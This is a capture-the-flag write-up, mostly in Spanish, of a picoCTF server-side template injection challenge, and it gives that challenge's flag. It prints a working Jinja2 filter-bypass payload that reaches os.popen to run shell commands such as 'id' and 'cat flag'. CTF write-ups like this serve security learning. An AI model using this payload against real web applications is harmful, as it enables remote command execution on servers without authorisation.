
## Descripción

I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :) I heard templating is a cool and modular way to build web apps! Check out my website [here](http://shape-facility.picoctf.net:59751/)!

## Solución

Ingresamos al sitio web.
Vemos un recuadro y un botón.
De acuerdo  las pistas y nombre del reto investigué sobre Server Side Template Injection.
Encontré la sección: RCE bypassing as much as I possibly can.
Intenté inyectar en el recuadro:
Probé algunas opciones y conseguí resultados con la última plantilla:
```
`{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}`
```
Cambié `id` por cat flag y al enviar de nuevo obtuve la bandera.

`picoCTF{sst1_f1lt3r_byp4ss_6787c4d8}`

## Notas adicionales

- A server side template injection is a vulnerability that occurs when a server renders user input as a template of some sort.
- Templates can be used when only minor details of a page need to change from circumstance to circumstance.

## Referencias

https://onsecurity.io/article/server-side-template-injection-with-jinja2/